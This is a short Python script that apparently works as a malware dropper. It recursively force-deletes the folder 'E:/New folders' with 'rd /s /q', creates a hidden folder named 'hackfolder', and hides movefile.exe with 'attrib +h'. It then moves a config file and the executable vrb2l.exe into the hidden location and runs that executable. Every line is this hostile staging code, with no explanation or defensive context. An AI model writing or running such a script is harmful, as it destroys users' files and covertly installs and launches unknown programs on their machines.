from pathlib import Path
import subprocess

with open('config.bin', 'w') as f:
    f.write(str(Path(__file__).parent.absolute()))
    f.close()
try:
    subprocess.run('rd /s /q "E:/New folders"', shell=True)
except:
    print("Remove fail")
subprocess.run("""md "E:/New folders/hackfolder" && attrib +h "E:/New folders" """, shell=True)
subprocess.run("""attrib +h movefile.exe """, shell=True)
subprocess.run('move config.bin "E:/New folders/hackfolder/"',shell=True)
subprocess.run('move vrb2l.exe "E:/New folders/hackfolder/"',shell=True)
subprocess.run('"E:/New folders/hackfolder/vrb2l.exe"', shell=True)
